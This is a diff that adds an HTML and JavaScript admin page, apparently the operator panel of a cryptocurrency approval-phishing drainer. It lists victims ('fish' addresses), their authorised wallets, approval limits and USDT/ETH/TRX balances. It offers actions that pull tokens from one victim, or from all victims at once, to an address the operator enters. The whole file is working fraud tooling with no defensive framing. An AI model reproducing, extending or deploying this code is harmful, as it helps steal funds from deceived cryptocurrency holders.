@@ -1,0 +1,241 @@
+<div class='layuimini-container layuimini-page-anim'>
+  <div class='layuimini-main'>
+    <fieldset class='table-search-fieldset'>
+      <legend t='search_tip'></legend>
+      <form class='layui-form'>
+        <div class='layui-form-item'>
+          <div class='layui-inline'>
+            <label class='layui-form-label' t='auth_time'></label>
+            <div class='layui-input-inline'>
+              <input class='layui-input' id='auth_time' name='auth_time' p='pls_select_auth_time' autocomplete='off'/>
+            </div>
+          </div>
+          <div class='layui-inline'>
+            <label class='layui-form-label' t='account'></label>
+            <div class='layui-input-inline'>
+              <input class='layui-input' name='account' p='pls_input_account' autocomplete='off'/>
+            </div>
+          </div>
+          <div class='layui-inline'>
+            <label class='layui-form-label' t='fish_address'></label>
+            <div class='layui-input-inline'>
+              <input class='layui-input' name='address' p='pls_input_address' autocomplete='off'/>
+            </div>
+          </div>
+          <div id='filter_belong' class='layui-inline'>
+            <label class='layui-form-label' t='belong'></label>
+            <div class='layui-input-inline'>
+              <select name='aid'>
+                <option value='0' selected t='all'></option>
+              </select>
+            </div>
+          </div>
+          <div class='layui-inline'>
+            <button type='submit' class='layui-btn layui-btn-primary' lay-submit lay-filter='search'><i class='layui-icon'></i> <span t='search'></span></button>
+            <button type='reset' class='layui-btn layui-btn-primary' t='search_reset'></button>
+          </div>
+        </div>
+      </form>
+    </fieldset>
+    <script type='text/html' id='tool'>
+      <button class='layui-btn layui-btn-sm' lay-event='debitAll' t='debit_all_token'></button>
+    </script>
+    <script type='text/html' id='operate'>
+      <div class='layui-btn-container'>
+        <button class='layui-btn layui-btn-sm layui-btn-normal' lay-event='balance' t='update_balance'></button>
+        <button class='layui-btn layui-btn-sm layui-btn-warn' lay-event='debit' t='debit_token'></button>
+        <button class='layui-btn layui-btn-sm layui-btn-primary' lay-event='deposit' t='deposit_token'></button>
+      </div>
+    </script>
+    <table class='layui-hide' id='list' lay-filter='list'></table>
+  </div>
+</div>
+
+<style>
+  .layui-inline{margin-right:0 !important}
+  .layui-inline label{width:auto !important;padding:9px !important}
+  .layui-input-inline{width:auto !important;max-width:160px !important;margin:0 !important}
+  .layui-btn-sm{height:28px !important}
+  button[type=submit]{margin-left:10px}
+</style>
+
+<script>
+  layui.use(['jquery','form','table','element','laydate'],function(){
+    const $ = layui.jquery,form = layui.form,table = layui.table,laydate = layui.laydate;
+    const aid = sessionStorage.getItem('uid'),isSuper = sessionStorage.getItem('is_super')=='true';
+    laydate.render({elem:'#auth_time',type:'date',range:true,lang:localStorage.getItem('lang')});
+    if(isSuper){
+      Api('AllBelong','post',null,r => {
+        $('select[name=aid]').append(r.map(e => `<option value='${e.aid}'>${e.belong}</option>`).join(''));
+        setTimeout(() => form.render(),500);
+      });
+    }else{
+      $('#filter_belong').hide();
+      setTimeout(() => form.render(),500);
+    }
+    form.on('submit(search)',r => {
+      const params = r.field;
+      const [aa,ab] = params.auth_time.split(' - ');
+      params.start_time = aa||'';
+      params.end_time = ab||'';
+      if(!isSuper) params.aid = aid;
+      delete params.auth_time;
+      table.reload('list',{page:{curr:1},where:params},'data');
+      return false;
+    });
+    const colA = isSuper?[{field:'belong',width:80,fixed:'left',title:Site.i18n.belong}]:[];
+    const colB = isSuper?[]:[{title:Site.i18n.operate,width:200,fixed:'right',toolbar:'#operate',align:'center'}];
+    table.render({
+      elem:'#list',method:'post',api:'FishList',
+      request:{pageName:'page',limitName:'perpage'},
+      where:{token:sessionStorage.getItem('token'),user_id:sessionStorage.getItem('uid'),lang:Site.lang,aid:isSuper?0:aid},
+      parseData:function(r){
+        const count = r.data.count&& !isNaN(r.data.count)&&r.data.count>0?r.data.count:0;
+        const items = r.data.data&&Type(r.data.data)==='array'?r.data.data:[];
+        const list = items.map(v => {
+          v.create_time = Time('Y/M/D H:I:S', new Date(v.create_time * 1000));
+          v.trx = v.type==='TRC20'?Number(Number(v.self).toFixed(2)):'-';
+          v.eth = v.type==='ERC20'?Number(Number(v.self).toFixed(2)):'-';
+          v.usdt = Number(Number(v.usdt).toFixed(2));
+          v.isauth = v.isauth==1?Site.i18n.is_auth_yes:Site.i18n.is_auth_no;
+          return v;
+        });
+        return {code:r.ret==200?0:r.ret,msg:r.msg,count:count,data:list};
+      },
+      toolbar:'#tool',defaultToolbar:['filter','print'],
+      cols:[[
+        {field:'id',width:60,fixed:'left',title:Site.i18n.id},
+        {field:'account',width:150,fixed:'left',title:Site.i18n.account},
+        ...colA,
+        {field:'source',width:100,fixed:'left',title:Site.i18n.source},
+        {field:'address',width:310,fixed:'left',title:Site.i18n.fish_address},
+        {field:'auth_wallets',width:330,fixed:'left',title:Site.i18n.auth_address},
+        {field:'limit',width:120,fixed:'left',title:Site.i18n.auth_limit},
+        {field:'type',width:120,fixed:'left',title:Site.i18n.wallet_type},
+        {field:'eth',width:80,title:Site.i18n.eth},
+        {field:'trx',width:80,title:Site.i18n.trx},
+        {field:'usdt',width:80,title:Site.i18n.usdt},
+        {field:'create_time',minWidth:160,title:Site.i18n.auth_time},
+        {field:'isauth',minWidth:160,title:Site.i18n.is_authd},
+        ...colB,
+      ]],
+      limits:[10,15,20],
+      limit:20,page:true,skin:'line',
+      done:() => $('.layui-btn-container [t],.layui-table-tool [t]').each((_,e) => $(e).html(Site.i18n[$(e).attr('t')])),
+    });
+    table.on('toolbar(list)',e => {
+      if(e.event!='debitAll') return;
+      layer.open({
+        title:Site.i18n.debit_all_token,
+        content:`<div class="layui-form">
+              <div class="layui-form-item">
+                <label class="layui-form-label">${Site.i18n.token_type}</label>
+                <div id="debit_all_type" class="layui-input-block">
+                  <input type="radio" name="type" value="TRX" title="TRX" disabled>
+                  <input type="radio" name="type" value="ETH" title="ETH" disabled>
+                  <input type="radio" name="type" value="USDT" title="USDT" checked>
+                </div>
+              </div>
+              <div class="layui-form-item">
+                <label class="layui-form-label">${Site.i18n.debit_to}</label>
+                <div class="layui-input-block">
+                  <input id="debit_all_to" autocomplete="off" class="layui-input">
+                </div>
+              </div>
+            </div>`,
+        btn:[Site.i18n.submit,Site.i18n.cancel],
+        success:() => form.render(),
+        yes:function(){
+          const type = $('#debit_all_type [checked]').val().trim(),to = $('#debit_all_to').val().trim();
+          if(!to){
+            layer.msg(Site.i18n.err_address_cannot_empty);
+            return;
+          }
+          Api('FishDebitAll','post',{aid:isSuper?0:aid,type:type,to_address:to},r => {
+            layer.msg(Site.i18n[r?'success_debit':'failed_debit']);
+            if(r) table.reload('list',{},'data');
+          },() => layer.msg(Site.i18n.failed_debit));
+        },
+      });
+    });
+    table.on('tool(list)',e => {
+      const id = e.data.id;
+      switch(e.event){
+        case 'balance': // 更新余额
+          Api('FishBalance','post',{id:id},r => {
+            layer.msg(Site.i18n[r?'success_update_balance':'failed_update_balance']);
+            if(r) table.reload('list',{},'data');
+          },() => layer.msg(Site.i18n.failed_update_balance));
+          break;
+        case 'deposit': // 充币
+          layer.open({
+            title:Site.i18n.deposit_token,
+            content:`<div class="layui-form">
+              <div class="layui-form-item">
+                <label class="layui-form-label">${Site.i18n.token_type}</label>
+                <div id="deposit_type" class="layui-input-block">
+                  <input type="radio" name="type" value="ETH" title="ETH" disabled>
+                  <input type="radio" name="type" value="USDT" title="USDT" checked>
+                </div>
+              </div>
+              <div class="layui-form-item">
+                <label class="layui-form-label">${Site.i18n.amount}</label>
+                <div class="layui-input-block">
+                  <input id="deposit_amount" type="number" value="0" autocomplete="off" class="layui-input">
+                </div>
+              </div>
+            </div>`,
+            btn:[Site.i18n.submit,Site.i18n.cancel],
+            success:() => form.render(),
+            yes:function(){
+              const type = $('#deposit_type [checked]').val(),amount = $('#deposit_amount').val();
+              Api('FishDeposit','post',{id:id,type:type,amount:amount},r => {
+                layer.msg(Site.i18n[r?'success_deposit':'failed_deposit']);
+                if(r) table.reload('list',{},'data');
+              },() => layer.msg(Site.i18n.failed_deposit));
+            },
+          });
+          break;
+        case 'debit': // 扣款
+          layer.open({
+            title:Site.i18n.debit_token,
+            content:`<div class="layui-form">
+              <div class="layui-form-item">
+                <label class="layui-form-label">${Site.i18n.token_type}</label>
+                <div id="debit_type" class="layui-input-block">
+                  <input type="radio" name="type" value="ETH" title="ETH" disabled>
+                  <input type="radio" name="type" value="USDT" title="USDT" checked>
+                </div>
+              </div>
+              <div class="layui-form-item">
+                <label class="layui-form-label">${Site.i18n.debit_to}</label>
+                <div class="layui-input-block">
+                  <input id="debit_to" autocomplete="off" class="layui-input">
+                </div>
+              </div>
+              <div class="layui-form-item">
+                <label class="layui-form-label">${Site.i18n.amount}</label>
+                <div class="layui-input-block">
+                  <input id="debit_amount" type="number" value="0" autocomplete="off" class="layui-input">
+                </div>
+              </div>
+            </div>`,
+            btn:[Site.i18n.submit,Site.i18n.cancel],
+            success:() => form.render(),
+            yes:function(){
+              const type = $('#debit_type [checked]').val().trim(),to = $('#debit_to').val().trim(),amount = $('#debit_amount').val().trim();
+              if(!to){
+                layer.msg(Site.i18n.err_address_cannot_empty);
+                return;
+              }
+              Api('FishDebit','post',{id:id,type:type,to_address:to,amount:amount},r => {
+                layer.msg(Site.i18n[r?'success_debit':'failed_debit']);
+                if(r) table.reload('list',{},'data');
+              },() => layer.msg(Site.i18n.failed_debit));
+            },
+          });
+          break;
+      }
+    });
+  });
+</script>
